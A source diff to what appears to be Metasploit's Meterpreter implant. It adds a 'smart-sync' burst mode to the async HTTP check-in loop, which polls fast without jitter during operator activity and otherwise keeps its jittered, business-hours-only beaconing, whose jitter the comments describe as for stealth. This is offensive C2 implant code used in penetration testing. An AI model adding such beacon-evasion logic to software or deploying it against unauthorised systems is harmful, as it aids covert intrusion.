@@ -4,6 +4,46 @@
  */
 #include "metsrv.h"
 
+// Delay (in ms) used for the tight poll loop while inside a smart-sync burst
+// window. Kept short so that chained multi-request commands (e.g. ls) flow
+// without operator wait, but not zero so we don't hammer the transport if
+// the framework hasn't queued the next request yet.
+#define ASYNC_SMART_SYNC_BURST_MS 1000
+
+/*!
+ * @brief Update the last-activity timestamp used by the smart-sync burst window.
+ * @param ctx Pointer to the HTTP transport context containing async config.
+ */
+VOID async_touch_activity(HttpTransportContext* ctx)
+{
+	if (ctx == NULL)
+	{
+		return;
+	}
+	ctx->async_last_activity_ticks = GetTickCount();
+}
+
+/*!
+ * @brief Determine whether the implant is currently inside a smart-sync burst window.
+ * @param ctx Pointer to the HTTP transport context containing async config.
+ * @returns TRUE if smart-sync is enabled and recent activity keeps us in-burst.
+ */
+BOOL async_in_smart_sync_window(HttpTransportContext* ctx)
+{
+	if (ctx == NULL || ctx->async_smart_sync_seconds == 0)
+	{
+		return FALSE;
+	}
+
+	// GetTickCount() wraps every ~49 days; unsigned subtraction handles the
+	// wraparound correctly so long as the window is much smaller than the
+	// wrap period (smart_sync is in seconds, so this is trivially true).
+	DWORD now = GetTickCount();
+	DWORD elapsedMs = now - ctx->async_last_activity_ticks;
+	DWORD windowMs = ctx->async_smart_sync_seconds * 1000;
+	return elapsedMs < windowMs;
+}
+
 /*!
  * @brief Determine if the current local hour falls within business hours on an active day.
  * @param ctx Pointer to the HTTP transport context containing async config.
@@ -49,10 +89,20 @@ BOOL async_in_work_hours(HttpTransportContext* ctx)
 /*!
  * @brief Calculate the sleep duration in milliseconds for the current async poll cycle.
  * @param ctx Pointer to the HTTP transport context containing async config.
- * @returns Sleep duration in milliseconds with jitter applied.
+ * @returns Sleep duration in milliseconds with jitter applied. Returns a short
+ *          burst interval (no jitter) when inside the smart-sync window.
  */
 DWORD async_calculate_sleep_ms(HttpTransportContext* ctx)
 {
+	// Smart-sync burst: recent activity implies an operator interaction is in
+	// flight; keep polling fast so chained requests complete promptly.
+	// Jitter is intentionally skipped inside the burst window — the goal here
+	// is responsiveness, not stealth (the operator is already talking to us).
+	if (async_in_smart_sync_window(ctx))
+	{
+		return ASYNC_SMART_SYNC_BURST_MS;
+	}
+
 	DWORD intervalMs = ctx->async_poll_interval * 1000;
 
 	if (ctx->async_poll_jitter > 0 && ctx->async_poll_jitter < 100)
@@ -95,6 +145,7 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 
 		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_ENABLED);
 		ctx->async_mode = enabled;
+		remote->async_mode = enabled;
 
 		if (enabled)
 		{
@@ -103,6 +154,7 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			UINT workStart = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_START);
 			UINT workEnd = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_END);
 			UINT workDays = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_DAYS);
+			UINT smartSync = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_SMART_SYNC);
 
 			// Apply poll interval (minimum 10 seconds to avoid spin)
 			if (pollInterval >= 10)
@@ -136,15 +188,27 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			// Work days bitmask (7 bits: bit0=Sun..bit6=Sat)
 			ctx->async_work_days = workDays & 0x7F;
 
+			// Smart-sync burst window (seconds). 0 disables the feature and
+			// keeps behavior backward compatible with framework versions that
+			// don't send the TLV.
+			ctx->async_smart_sync_seconds = smartSync;
+
+			// Seed the last-activity timestamp so we don't accidentally start
+			// in an "always in burst" state due to an uninitialized value.
+			// We deliberately set it far enough in the past that the first
+			// check-in uses the normal poll_interval unless a request arrives.
+			ctx->async_last_activity_ticks = GetTickCount() - (smartSync * 1000) - 1000;
+
 			// Create the wake event (auto-reset) so sleeps can be interrupted
 			if (ctx->async_wake_event == NULL)
 			{
 				ctx->async_wake_event = CreateEvent(NULL, FALSE, FALSE, NULL);
 			}
 
-			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X",
+			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X, smart_sync=%us",
 				ctx->async_poll_interval, ctx->async_poll_jitter,
-				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days);
+				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days,
+				ctx->async_smart_sync_seconds);
 		}
 		else
 		{
@@ -163,6 +227,8 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			ctx->async_work_start = 0;
 			ctx->async_work_end = 0;
 			ctx->async_work_days = 0;
+			ctx->async_smart_sync_seconds = 0;
+			ctx->async_last_activity_ticks = 0;
 		}
 
 		met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_ENABLED, ctx->async_mode);
